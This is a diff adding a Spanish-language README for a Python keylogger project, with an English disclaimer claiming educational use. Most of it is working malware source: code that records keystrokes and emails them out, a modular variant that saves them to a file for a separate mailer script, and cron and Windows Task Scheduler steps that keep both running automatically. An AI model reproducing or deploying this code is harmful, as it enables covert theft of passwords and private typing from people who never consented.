@@ -1,0 +1,141 @@
+This project is intended solely for educational purposes and ethical security audits. Using this code for illegitimate purposes, such as accessing information without explicit consent from the owner, is illegal and unethical. The developers and contributors to this project disclaim any responsibility for misuse or any consequences arising from the use of this code
+
+# Keylogger y Envío de Correos - Ejemplo de Configuración Modular e Integración
+
+Este proyecto demuestra cómo un keylogger y un sistema de envío de correos electrónicos pueden trabajar juntos, ya sea mediante **integración continua** o bajo un enfoque de **modularidad**. Se explican ambos enfoques, su configuración y las herramientas necesarias.
+
+---
+
+## **Estructura del Proyecto**
+
+### Archivos principales:
+1. **Keylogger (`keylogger.py`)**: Captura las pulsaciones de teclas y almacena la información.
+2. **Envío de correos (`email_sender.py`)**: Envía la información recopilada por el keylogger mediante correo electrónico.
+
+---
+
+## **Enfoques**
+
+### **1. Integración Continua**
+En este enfoque, tanto el keylogger como el sistema de envío de correos están integrados en un único archivo que ejecuta ambas funciones.
+
+#### **Código Ejemplo**:
+```python
+import keyboard
+import time
+from EmailSender import send_email
+
+# Obtener fecha y hora actual
+tiempo_local = time.localtime()
+fecha_hora_actual = time.strftime("%Y-%m-%d %H:%M:%S", tiempo_local)
+
+# Variable para almacenar el texto registrado
+text = f"Recorded content from keylogger\nAt {fecha_hora_actual}\n"
+text += "----------------------------\n\n"
+
+def process_key_event(event):
+    global text
+    key = event.name
+    if event.event_type == 'down':
+        if key == 'enter':
+            text += "\n"
+        elif key == 'space':
+            text += " "
+        elif key == 'backspace':
+            text = text[:-1]
+        else:
+            text += key
+
+keyboard.on_press(process_key_event)  # Registrar eventos de teclado
+
+try:
+    print("Keylogger iniciado. Presiona Ctrl+C para detener.")
+    while True:
+        if len(text) >= 200:
+            send_email(text)  # Enviar contenido registrado por correo
+            text = ""  # Reiniciar el texto
+except KeyboardInterrupt:
+    print("Keylogger detenido.")
+2. Modularidad
+En este enfoque, los programas funcionan de manera independiente, conectados a través de un archivo intermedio.
+
+Archivos involucrados:
+Keylogger:
+
+Guarda las pulsaciones en un archivo (por ejemplo, keylogger_output.txt).
+
+python
+import keyboard
+from FileSaver import save_content_to_file
+
+text = "Pulsaciones registradas:\n\n"
+
+def process_key_event(event):
+    global text
+    key = event.name
+    if event.event_type == 'down':
+        if key == 'enter':
+            text += "\n"
+        elif key == 'space':
+            text += " "
+        elif key == 'backspace':
+            text = text[:-1]
+        else:
+            text += key
+
+keyboard.on_press(process_key_event)
+
+try:
+    while True:
+        if len(text) >= 200:
+            save_content_to_file("keylogger_output.txt", text)
+            text = ""  # Reiniciar el texto
+except KeyboardInterrupt:
+    print("Keylogger detenido.")
+Script para Enviar Correos:
+
+Envía el archivo de texto por correo.
+
+python
+from EmailSender import send_email
+
+try:
+    with open("keylogger_output.txt", "r") as file:
+        mensaje = file.read()
+    send_email(mensaje)
+except FileNotFoundError:
+    print("El archivo no existe. Ejecuta el keylogger primero.")
+except Exception as e:
+    print(f"Error al enviar el correo: {e}")
+Programación Automática de Tareas
+Linux/Unix - Usando cron
+Edita el archivo de configuración:
+
+bash
+crontab -e
+Configura horarios específicos:
+
+bash
+# Ejecutar el keylogger cada hora
+0 * * * * python3 /ruta/a/keylogger.py
+
+# Ejecutar el script de correo a medianoche
+0 0 * * * python3 /ruta/a/email_sender.py
+Windows - Usando el Programador de tareas
+Abre el Programador de tareas.
+
+Crea tareas separadas:
+
+Una para ejecutar el keylogger (ejemplo: cada hora).
+
+Otra para enviar correos (ejemplo: a medianoche).
+
+Usa las rutas absolutas para Python y los archivos .py.
+
+Ruta del Archivo
+Por defecto, el archivo generado por el keylogger (keylogger_output.txt) se guarda en la ruta desde donde se ejecuta el programa.
+
+Si deseas especificar una ruta fija, asegúrate de usar una ruta absoluta en el código. Por ejemplo:
+
+python
+save_content_to_file("/ruta/definida/keylogger_output.txt", text)
